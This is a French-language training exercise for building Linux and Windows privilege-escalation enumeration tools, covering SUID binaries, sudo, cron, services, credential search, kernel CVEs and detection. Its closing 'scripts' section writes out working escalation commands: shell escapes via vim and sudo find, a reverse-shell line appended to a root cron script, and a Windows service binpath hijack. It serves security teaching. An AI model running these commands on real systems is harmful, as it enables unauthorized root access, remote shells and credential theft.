EXERCICE 24: PRIVILEGE ESCALATION
==================================

AVERTISSEMENT CRITIQUE:
L'escalade de privilèges sans autorisation est ILLÉGALE.
Usage STRICTEMENT éducatif dans environnements autorisés UNIQUEMENT.
Ne JAMAIS utiliser sur systèmes de production ou sans permission explicite.

Objectif:
---------
Développer des outils d'énumération et d'exploitation pour l'escalade de privilèges
sur systèmes Linux et Windows. Comprendre les vecteurs d'attaque pour mieux sécuriser
les systèmes.

Défis à Implémenter:
--------------------

1. ÉNUMÉRATION SYSTÈME COMPLÈTE
   - Collecter informations système (OS, version, kernel)
   - Lister utilisateurs et groupes
   - Identifier l'utilisateur actuel et privilèges
   - Collecter variables d'environnement importantes
   - Lister processus en cours d'exécution
   - Vérifier les interfaces réseau et connexions
   Input: Aucun
   Output: Rapport complet d'énumération JSON/texte

2. RECHERCHE DE BINAIRES SUID/SGID
   - Scanner le système pour binaires avec SUID bit
   - Scanner pour binaires avec SGID bit
   - Identifier binaires exploitables (GTFOBins)
   - Vérifier permissions et ownership
   - Prioriser par potentiel d'exploitation
   Input: Répertoires à scanner (défaut: /)
   Output: Liste de binaires suspects avec détails

3. ANALYSE DES PERMISSIONS SUDO
   - Lire et parser sudo -l output
   - Identifier NOPASSWD entries
   - Détecter wildcards exploitables
   - Vérifier version sudo pour CVEs connues
   - Suggérer techniques d'exploitation
   Input: Sudo permissions de l'utilisateur
   Output: Analyse des permissions avec recommandations

4. SCAN DES CRON JOBS
   - Lister tous les cron jobs système et utilisateur
   - Vérifier /etc/crontab
   - Scanner /etc/cron.d/, /etc/cron.daily/, etc.
   - Identifier scripts avec permissions faibles
   - Vérifier ownership et writability
   - Détecter PATH exploitation possibilities
   Input: Aucun
   Output: Liste de cron jobs avec vulnérabilités

5. ÉNUMÉRATION SERVICES WINDOWS
   - Lister tous les services Windows
   - Identifier chemins de service non-quotés
   - Vérifier permissions des services
   - Détecter services avec chemins modifiables
   - Identifier services auto-start
   Input: Aucun (Windows seulement)
   Output: Services vulnérables avec vecteurs d'exploitation

6. RECHERCHE DE CREDENTIALS
   - Scanner fichiers de configuration communs
   - Vérifier historiques (bash, PowerShell, etc.)
   - Lire variables d'environnement sensibles
   - Scanner pour clés SSH privées
   - Rechercher fichiers de backup (.bak, .old)
   - Vérifier fichiers de logs pour secrets
   Input: Répertoires à scanner
   Output: Credentials et secrets trouvés

7. EXPLOITATION KERNEL
   - Identifier version du kernel
   - Rechercher CVEs exploitables pour cette version
   - Suggérer exploits publics disponibles
   - Vérifier si système est patchable
   - Tester vulnérabilités Dirty COW, overlayfs, etc.
   Input: Version kernel
   Output: CVEs applicables avec exploits

8. SCRIPT D'ÉNUMÉRATION AUTOMATISÉ
   - Combiner tous les modules d'énumération
   - Exécuter scan complet automatique
   - Prioriser vulnérabilités par exploitabilité
   - Générer rapport détaillé
   - Suggérer vecteurs d'escalade dans l'ordre
   - Mode verbeux et silencieux
   Input: Options de scan
   Output: Rapport complet avec recommandations priorisées

Exemples d'Utilisation:
-----------------------

# Défi 1: Énumération Système
python main.py enum-system --output system_info.json

# Défi 2: SUID Binaries
python main.py find-suid --path / --check-gtfobins

# Défi 3: Sudo Analysis
python main.py analyze-sudo

# Défi 4: Cron Jobs
python main.py scan-cron --verbose

# Défi 5: Services Windows
python main.py enum-services --check-unquoted --check-permissions

# Défi 6: Credentials
python main.py find-credentials --paths /home,/var,/opt

# Défi 7: Kernel Exploits
python main.py check-kernel --suggest-exploits

# Défi 8: Full Enumeration
python main.py full-enum --output report.txt --priority high

Contraintes:
------------
1. Environnements de TEST UNIQUEMENT
2. Autorisation écrite requise avant tout scan
3. Ne pas altérer le système pendant énumération
4. Gérer les permissions insuffisantes gracieusement
5. Code commenté en FRANÇAIS
6. Logging de toutes les actions
7. Mode non-invasif par défaut
8. Respect des lois et réglementations

Tests de Validation:
--------------------
1. Énumération détecte toutes les infos système
2. SUID scan trouve les binaires avec bit SUID
3. Sudo analysis identifie les misconfigurations
4. Cron scan trouve les jobs avec permissions faibles
5. Services Windows détecte chemins non-quotés
6. Credential scan trouve secrets dans configs
7. Kernel check identifie CVEs applicables
8. Full enum génère rapport complet et priorisé

Vecteurs d'Escalade Communs:
----------------------------

LINUX:
1. SUID Binaries:
   - find, vim, nmap, python, perl avec SUID
   - Exploitation via GTFOBins

2. Sudo Misconfigurations:
   - user ALL=(ALL) NOPASSWD: /bin/bash
   - Wildcards: /usr/bin/cp /tmp/* /root/

3. Kernel Exploits:
   - Dirty COW (CVE-2016-5195)
   - Overlayfs (CVE-2015-1328)

4. Cron Jobs:
   - Scripts world-writable exécutés par root

5. NFS Shares:
   - no_root_squash misconfiguration

WINDOWS:
1. Unquoted Service Paths:
   - C:\Program Files\Vulnerable App\service.exe

2. Weak Service Permissions:
   - Services modifiables par Users group

3. AlwaysInstallElevated:
   - Registry keys permettant MSI avec SYSTEM

4. DLL Hijacking:
   - Services chargeant DLLs depuis chemins modifiables

5. Token Impersonation:
   - SeImpersonatePrivilege exploitation (Potato attacks)

Exemple de Rapport Attendu:
---------------------------

PRIVILEGE ESCALATION ENUMERATION REPORT
========================================

System Information:
  OS: Linux Ubuntu 20.04
  Kernel: 5.4.0-42-generic
  Hostname: target-machine
  Current User: lowpriv (uid=1001)

[HIGH] SUID Binary Found: /usr/bin/vim
  - Owner: root
  - GTFOBins entry available
  - Exploitation: vim -c ':!/bin/sh'

[HIGH] Sudo Misconfiguration Detected
  - User can run: (ALL) NOPASSWD: /usr/bin/find
  - Exploitation: sudo find . -exec /bin/sh \; -quit

[MEDIUM] Writable Cron Job
  - File: /etc/cron.daily/backup.sh
  - Permissions: -rwxrwxrwx
  - Runs as: root
  - Exploitation: Inject reverse shell

[MEDIUM] Kernel Exploit Available
  - Current: 5.4.0-42-generic
  - CVE-2021-3493: Ubuntu OverlayFS exploit
  - Public exploit: Available

[LOW] Credentials in Config
  - File: /var/www/.env
  - Contains: DATABASE_PASSWORD=secret123

Recommended Exploitation Order:
1. Sudo find exploitation (easiest)
2. SUID vim exploitation
3. Writable cron job
4. Kernel exploit (last resort)

Scripts d'Exploitation Suggérés:
---------------------------------

# SUID vim exploitation
vim -c ':!/bin/sh'

# Sudo find exploitation
sudo find . -exec /bin/sh \; -quit

# Cron job injection
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /etc/cron.daily/backup.sh

# Windows unquoted service path
sc config VulnService binpath= "C:\Temp\malicious.exe"
sc start VulnService

Ressources:
-----------
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- LinPEAS script: https://github.com/carlospolop/PEASS-ng
- PayloadsAllTheThings: Privilege Escalation section
- HackTricks: Linux/Windows privilege escalation

Détection de Vos Scans:
-----------------------
Après développement des outils d'énumération, implémentez aussi la détection:
1. Monitoring de find avec -perm
2. Alertes sur sudo -l usage
3. Détection de modifications de cron jobs
4. Audit des accès à fichiers sensibles
5. Monitoring des changements de permissions

Cela vous apprend AUSSI la défense!

Notes Importantes:
------------------
- NE JAMAIS scanner systèmes de production sans autorisation
- Énumération peut être détectée par IDS/IPS
- Certaines techniques peuvent crasher le système
- Toujours avoir un backup avant exploitation
- Documenter TOUTES les actions pour rapport
- Nettoyer après tests (remove backdoors, restore configs)

RAPPEL ÉTHIQUE:
L'objectif est de comprendre les vecteurs d'escalade pour:
- Hardening de systèmes
- Tests de pénétration autorisés
- Formation en sécurité défensive
- Certification professionnelle
PAS pour compromettre des systèmes sans autorisation.

Après avoir implémenté ces outils, utilisez-les pour sécuriser VOS propres systèmes!
